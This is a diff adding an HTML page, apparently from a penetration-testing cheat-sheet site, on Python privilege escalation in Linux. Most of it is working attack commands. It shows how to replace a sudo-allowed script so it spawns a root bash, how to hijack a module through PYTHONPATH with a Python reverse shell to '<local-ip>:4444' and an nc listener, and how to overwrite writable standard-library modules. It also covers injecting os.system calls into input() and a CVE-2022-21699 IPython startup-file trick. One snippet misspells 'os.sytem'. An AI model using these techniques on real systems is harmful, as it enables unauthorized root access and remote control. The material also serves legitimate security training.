@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Python Privilege Escalation - readloud.org</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Sudo PrivEsc", url: "#_top", children: [
+              {title: "Replace with Arbitrary Script", url: "#replace-with-arbitrary-script" },
+              {title: "Module Hijacking", url: "#module-hijacking" },
+              {title: "Module Overriding", url: "#module-overriding" },
+          ]},
+          {title: "OS Commands in input()", url: "#os-commands-in-input", children: [
+          ]},
+          {title: "IPython Privilege Escalation (CVE-2022-21699)", url: "#ipython-privilege-escalation-cve-2022-21699", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h2 id="sudo-privesc">Sudo PrivEsc</h2>
+<h3 id="replace-with-arbitrary-script">Replace with Arbitrary Script</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>-l
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/usr/bin/python3<span class="w"> </span>/home/&lt;username&gt;/example.py
+</span></code></pre></div>
+<p>If the python script is under the current user's home directory, we can remove the script and create the new one with the same name.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>rm<span class="w"> </span>-rf<span class="w"> </span>/home/&lt;username&gt;/example.py
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>touch<span class="w"> </span>/home/&lt;username&gt;/example.py
+</span></code></pre></div>
+<p>We can insert arbitrary code in the new script. For example,</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="module-hijacking">Module Hijacking</h3>
+<p>Assume the python script can be executed as root with <strong>SETENV,NOPASSWD</strong>.<br />
+For example,</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo<span class="w"> </span>-l
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>SETENV:<span class="w"> </span>NOPASSWD:<span class="w"> </span>/usr/bin/python3<span class="w"> </span>/opt/example.py
+</span></code></pre></div>
+<p>With <strong>SETENV</strong>, we can change <strong>PYTHONPATH</strong> when executing the script, and insert malicious script to the module which is imported in the script.<br />
+First off, check what module is imported in the python script (e.g. /opt/example.py here).</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kn">import</span> <span class="nn">random</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nb">print</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
+</span></code></pre></div>
+<p>We can forge the imported module.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>vim<span class="w"> </span>/tmp/random.py
+</span></code></pre></div>
+<p>The content of the module is below. This is a script that executes reverse shell.<br />
+Replace <strong><code>&lt;local-ip&gt;</code></strong> with your local ip address.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>import<span class="w"> </span>socket,os,pty<span class="p">;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">()</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">&quot;&lt;local-ip&gt;&quot;</span>,4444<span class="o">))</span><span class="p">;</span><span class="o">[</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,fd<span class="o">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>fd<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">(</span><span class="m">0</span>,1,2<span class="o">)]</span><span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">&quot;bash&quot;</span><span class="o">)</span>
+</span></code></pre></div>
+<p>After that, in another local terminal, start listener for getting a shell.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<p>Then run the python script with updating <strong>PYTHONPATH</strong> in the remote machine.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>sudo<span class="w"> </span><span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp/<span class="w"> </span>/usr/bin/python3<span class="w"> </span>/opt/example.py
+</span></code></pre></div>
+<p>By setting <strong>"PYTHONPATH=/tmp/"</strong>, the python script will import modules from <strong>/tmp/</strong> directories so the <strong>"random"</strong> module is imported from <strong>/tmp/random.py</strong>.<br />
+Finally, we should get a shell in local terminal.</p>
+<h3 id="module-overriding">Module Overriding</h3>
+<p>If the Python script contains a module that can be modified by current user, we can inject arbitrary code into the module.<br />
+First, check what modules the Python script uses.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># example.py</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>import<span class="w"> </span>random
+</span></code></pre></div>
+<p>Assume the <strong>“random”</strong> module is used in the script.<br />
+Find the path of the module and check if it’s writable.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;random.py&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>ls<span class="w"> </span>-al<span class="w"> </span>/usr/lib/python3.6/random.py
+</span></code></pre></div>
+<p>If we know we can modify it, inject arbitrary code in this module.<br />
+Assume the <strong>“random”</strong> module path is <strong><code>/usr/lib/python3.6/random.py</code></strong>.</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># /usr/lib/python3.6/random.py</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="kn">import</span> <span class="nn">os</span><span class="p">;</span><span class="n">os</span><span class="o">.</span><span class="n">sytem</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+<p>Then execute the Python script and we can spawn the root shell.</p>
+<p><br /></p>
+<h2 id="os-commands-in-input">OS Commands in input()</h2>
+<p>If you find the executable which is created in Python.<br />
+For instance,</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>./executable
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>Enter<span class="w"> </span>some<span class="w"> </span>input:
+</span></code></pre></div>
+<p>You can enter OS commands in some input.</p>
+<div class="language-py highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+<p>For example,</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>./executable
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>Enter<span class="w"> </span>some<span class="w"> </span>input:<span class="w"> </span>__import__<span class="o">(</span><span class="s1">&#39;os&#39;</span><span class="o">)</span>.system<span class="o">(</span><span class="s1">&#39;id&#39;</span><span class="o">)</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="ipython-privilege-escalation-cve-2022-21699">IPython Privilege Escalation (<a href="https://github.com/advisories/GHSA-pq7m-3gw7-gq5x">CVE-2022-21699</a>)</h2>
+<p>Interective Python (IPython) is a command shell for interective computing in multiple programming languages.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># -m: file mode (rwx)</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>mkdir<span class="w"> </span>-m<span class="w"> </span><span class="m">777</span><span class="w"> </span>/tmp/profile_default
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>mkdir<span class="w"> </span>-m<span class="w"> </span><span class="m">777</span><span class="w"> </span>/tmp/profile_default/startup
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;print(&quot;stealing your private secrets&quot;)&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/profile_default/startup/exploit.py
+</span></code></pre></div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/os/linux/privilege-escalation/python-privilege-escalation.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
